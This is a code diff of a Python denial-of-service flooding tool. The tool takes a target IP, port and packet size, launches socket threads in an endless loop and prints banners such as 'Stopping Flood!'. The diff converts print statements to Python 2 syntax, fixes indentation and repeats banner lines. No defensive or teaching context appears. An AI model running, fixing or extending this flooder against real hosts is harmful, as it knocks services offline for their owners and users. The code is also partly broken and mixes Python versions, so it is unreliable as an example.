@@ -42,8 +42,8 @@ print("\033[92m       ⁹           ⁵  ⁵        ⁵             \033[0m")
     
 
 if len(sys.argv) < 4:
-   print("")
-   sys.exit("Usage: python "+sys.argv[0]+" <ip> <port> <size>")
+    print ""
+    sys.exit("Usage: python "+sys.argv[0]+" <ip> <port> <size>")
 
 ip = sys.argv[1]
 port = int(sys.argv[2])
@@ -71,8 +71,7 @@ class tcp(threading.Thread):
         self.size = size
         self.packets = packets
         self.tcp = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-        
-threading.Thread.__init__(self)
+        threading.Thread.__init__(self)
     def run(self):
         for i in range(self.packets):
             try:
@@ -111,10 +110,12 @@ while True:
         u.start()
         print("\033[33m[\033[1m+\033[33m]\033[92m0ps BADAI GURUN   " +str(u)+ "  \033[33mZN33P3R 6453 " +str()+ "   \033[97m" +ip+ "\033[0m" )
         t.start()
+        print("\033[33m[\033[1m+\033[33m]\033[92m0ps BADAI GURUN   " +str(u)+ "  \033[33mZN33P3R 6453 " +str()+ "   \033[97m" +ip+ "\033[0m" )
         s.start()
+        print("\033[33m[\033[1m+\033[33m]\033[92m0ps BADAI GURUN   " +str(u)+ "  \033[33mZN33P3R 6453 " +str()+ "   \033[97m" +ip+ "\033[0m" )
     except KeyboardInterrupt:
-        print ("Stopping Flood!")
+        print "Stopping Flood!"
         sys.exit()
-    except 'socket.error' (msg):
-        print ("Socket Couldn't Connect")
+    except socket.error, msg:
+        print "Socket Couldn't Connect"
         sys.exit()
